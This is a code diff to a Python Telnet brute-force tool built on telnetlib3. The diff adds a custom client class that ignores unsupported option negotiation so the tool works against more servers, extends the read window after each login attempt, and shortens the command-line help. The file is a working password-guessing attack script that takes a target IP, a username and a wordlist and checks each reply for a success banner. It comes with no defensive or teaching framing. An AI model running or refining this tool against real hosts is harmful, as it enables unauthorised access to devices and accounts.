@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Telnet Brute Force (using telnetlib3)
+# Telnet Brute Force (using telnetlib3) - Fixed for limited servers
 
 import argparse
 import asyncio
@@ -32,17 +32,33 @@ def UpdateTimer(startTime):
             sys.stdout.flush()
         time.sleep(1)
 
+# 🧰 Custom protocol class to ignore WILL TTYPE, WILL LINEMODE, etc.
+class SafeTelnetClient(telnetlib3.BaseClient):
+    def handle_will(self, opt):
+        try:
+            super().handle_will(opt)
+        except ValueError:
+            pass  # Ignore unsupported options
+
 async def TryPassword(host, port, username, password, successBanner):
     try:
         reader, writer = await telnetlib3.open_connection(
-            host, port=port, shell=None, connect_minwait=0.1, connect_maxwait=1.0
+            host,
+            port=port,
+            shell=None,
+            connect_minwait=0.1,
+            connect_maxwait=1.0,
+            protocol_factory=lambda: SafeTelnetClient()
         )
+
         await reader.readuntil("User:")
         writer.write(username + "\r\n")
+
         await reader.readuntil("Password:")
         writer.write(password + "\r\n")
-        await asyncio.sleep(0.3)
-        output = await reader.read(1024)
+
+        await asyncio.sleep(0.4)
+        output = await reader.read(2048)
         writer.close()
         return successBanner in output
     except Exception:
@@ -96,16 +112,11 @@ def menu():
     asyncio.run(TelnetBruteForce(host, DEFAULT_PORT, username, passwords))
 
 def terminal():
-    parser = argparse.ArgumentParser(
-        description="Telnet Brute Force Tool (using telnetlib3)",
-        formatter_class=argparse.RawTextHelpFormatter
-    )
+    parser = argparse.ArgumentParser(description="Telnet Brute Force Tool (telnetlib3 safe)")
     parser.add_argument("-t", "--target", required=True, help="Target IP address")
     parser.add_argument("-u", "--username", required=True, help="Username to brute")
-    parser.add_argument("-w", "--wordlist", default="passwords.txt",
-                        help="Path to wordlist (default: passwords.txt)")
-    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
-                        help=f"Telnet port (default: {DEFAULT_PORT})")
+    parser.add_argument("-w", "--wordlist", default="passwords.txt", help="Wordlist path")
+    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT, help="Telnet port")
     args = parser.parse_args()
     passwords = LoadPasswords(args.wordlist)
     asyncio.run(TelnetBruteForce(args.target, args.port, args.username, passwords))
